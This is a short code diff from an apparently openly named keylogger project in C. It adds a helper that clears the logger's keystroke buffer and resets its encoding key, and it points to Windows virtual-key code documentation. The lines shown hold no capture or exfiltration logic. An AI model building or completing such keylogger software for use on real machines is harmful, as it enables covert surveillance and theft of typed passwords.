@@ -141,6 +141,16 @@ static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
 }
 
 /**
+ * set the buffer pointer to the start, and set the first character to a null
+ * terminator. Also rest the key loggers encoding key to the base key
+ */
+void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key) {
+    memset(kLogger->keyBuffer, '\0', MAX_BUFF_LEN);
+    kLogger->bufferPtr = 0;
+    kLogger->encKey = key;
+}
+
+/**
  * 
  * https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
  */
